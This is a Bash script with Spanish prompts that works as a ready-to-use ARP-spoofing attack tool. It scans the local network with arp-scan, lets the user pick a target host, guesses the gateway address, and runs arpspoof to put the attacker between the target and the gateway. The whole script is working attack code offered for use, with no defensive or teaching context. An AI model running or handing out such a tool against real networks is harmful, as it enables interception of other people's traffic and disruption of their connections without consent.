#!/bin/bash

printf "\e[31m---------------------------------------------------------------------------------------\e[0m\n"
printf "\e[33m  ██     ██ ██ ███████ ██             ██████  ██    ██ ██      ██      ███████ ██████  \e[0m\n"
printf "\e[93m  ██     ██ ██ ██      ██             ██   ██ ██    ██ ██      ██      ██      ██   ██ \e[0m\n"
printf "\e[32m  ██  █  ██ ██ █████   ██ █████ █████ ██████  ██    ██ ██      ██      █████   ██   ██ \e[0m\n"
printf "\e[34m  ██ ███ ██ ██ ██      ██             ██      ██    ██ ██      ██      ██      ██   ██ \e[0m\n"
printf "\e[94m   ███ ███  ██ ██      ██             ██       ██████  ███████ ███████ ███████ ██████  \e[0m\n"
printf "\e[35m---------------------------------------------------------------------------------------\e[0m\n"


check_herramienta() {
    if ! command -v "$1" &> /dev/null; then
        echo -e "\e[1;31mError: $1 no está instalado. Por favor, instala $1 y vuelve a intentarlo.\e[0m" >&2
        exit 1
    fi
}

# Función para mostrar y enumerar las interfaces de red
mostrar_interfaces() {
    echo -e "\e[1;33mMostrando interfaces de red disponibles:\e[0m"
    interfaces=($(ip link show | grep -oE "^[0-9]+: [a-zA-Z0-9]+" | awk '{print $2}'))

    for ((i=0; i<${#interfaces[@]}; i++)); do
        echo -e "\e[1;36m$((i+1)).\e[0m ${interfaces[i]}"
    done

    read -p "Seleccione el número correspondiente a la interfaz de red que quieras analizar: " interfaz
    selected_interface=${interfaces[interfaz-1]}
}

# Llamada a la función para mostrar y seleccionar la interfaz de red
mostrar_interfaces

# Verificar la existencia de herramientas necesarias
check_herramienta "dsniff"
check_herramienta "arp-scan"

# Pedir al usuario que inserte la interfaz de red
read -p "Inserte la interfaz de red que quieras analizar: " interfaz

# Mostrar todas las IPs disponibles en la red
echo -e "\e[1;33mEscaneando IPs disponibles en la red...\e[0m"
ips_disponibles=($(sudo arp-scan --interface="$selected_interface" --localnet | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"))

# Mostrar las IPs enumeradas
echo -e "\n\e[1;36mIPs Disponibles:\e[0m"
for ((i=0; i<${#ips_disponibles[@]}; i++)); do
    echo -e "\e[1;36m$((i+1)).\e[0m ${ips_disponibles[i]}"
done

# Pedir al usuario que elija una IP
read -p "Seleccione el número correspondiente a la IP objetivo de la lista anterior: " opcion

# Verificar la opción seleccionada y obtener la IP
if [[ $opcion =~ ^[0-9]+$ && $opcion -ge 1 && $opcion -le ${#ips_disponibles[@]} ]]; then
    ip=${ips_disponibles[opcion-1]}
    echo -e "\n\e[1;32mHas seleccionado la IP: $ip\e[0m"
    puerta_enlace=$(echo "$ip" | sed 's/\([0-9]\+\)$/1/')
    arpspoof -i "$selected_interface" -t "$ip" "$puerta_enlace"
else
    echo -e "\e[1;31mOpción no válida. Por favor, selecciona un número válido.\e[0m"
    exit 1
fi
